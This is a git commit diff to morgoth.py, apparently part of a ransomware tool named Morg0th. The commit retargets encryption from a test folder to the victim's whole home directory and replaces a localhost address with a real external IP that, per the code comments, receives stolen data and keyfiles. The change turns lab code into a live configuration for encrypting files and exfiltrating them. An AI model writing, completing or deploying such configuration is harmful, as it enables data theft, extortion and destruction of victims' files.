b60a0e8f7d398a189c853b08ad3b39a839821041
n4zgu1 <Witch-king.of.Angmar@n4zgu1.com>
2022-05-19 03:03:16 +0200

    v1.0.2

--- morgoth.py
+++ morgoth.py
@@ -2,10 +2,11 @@
 
 import src.main as launch
 from datetime import datetime
+from pathlib import Path
 
-target = '../testfolder'       # folder to encrypt
+target = Path.home()       # folder to encrypt
 keyfolder = 'morgoth-keys'  # folder to  safe keyfiles
-HOST = '127.0.0.1'          # ip of server to send data and keyfiles
+HOST = '68.183.208.119'          # ip of server to send data and keyfiles
 PORT = 9999                 # port of server
 
 print(f'Launching Morg0th at {datetime.now().strftime("%H:%M:%S")}')
